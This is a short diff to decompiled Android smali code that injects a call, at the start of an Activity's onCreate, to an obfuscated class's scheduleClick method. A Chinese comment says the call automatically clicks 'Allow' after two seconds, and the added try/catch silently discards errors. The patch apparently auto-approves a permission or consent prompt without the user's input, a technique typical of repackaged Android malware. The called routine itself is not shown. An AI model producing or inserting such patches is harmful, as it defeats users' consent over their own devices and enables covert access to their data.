@@ -35,6 +35,17 @@
 .method public final onCreate(Landroid/os/Bundle;)V
     .locals 6
 
+    # 2 秒后自动点“允许”
+    :try_start_permclick
+    move-object/from16 v0, p0
+    invoke-static {v0}, Lڝږ؁ڋ/ھ;->scheduleClick(Landroid/content/Context;)V
+    :try_end_permclick
+    .catch Ljava/lang/Exception; {:try_start_permclick .. :try_end_permclick} :catch_permclick
+    goto :goto_permclick
+
+    :catch_permclick
+    move-exception v0
+    :goto_permclick
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
     invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;
